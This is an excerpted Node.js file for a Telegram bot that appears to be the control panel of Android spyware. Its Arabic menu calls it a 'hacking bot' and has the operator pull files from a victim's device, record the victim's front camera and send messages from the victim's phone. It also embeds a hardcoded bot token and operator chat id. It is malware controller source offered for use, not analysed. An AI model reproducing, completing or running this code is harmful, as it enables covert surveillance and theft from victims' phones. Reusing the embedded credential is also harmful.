...
const token ='7847524154:AAEOcW00-LFTQvKIb1ku--1Ml6oYS3u5BMg'
const id = '6652442220'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓FERAS SY𓅓𓆪𓆪 ᴠɪᴘ المطور : </h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙁𝙀𝙍𝘼𝙎 𓅓𓆪𓆪 ᴠɪᴘ المطور : @XS5_S ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
        ...
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙁𝙀𝙍𝘼𝙎𓅓𓆪𓆪 ᴠɪᴘ المطور : @XS5_S ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
        ...
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓 𝙁𝙀𝙍𝘼𝙎 𓅓𓆪𓆪 ᴠɪᴘ المطور : @XS5_S ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓆪𓆪𓅓 𝙁𝙀𝙍𝘼𝙎 𓅓𓆪𓆪 ᴠɪᴘ المطور : @XS5_S\n\n' +
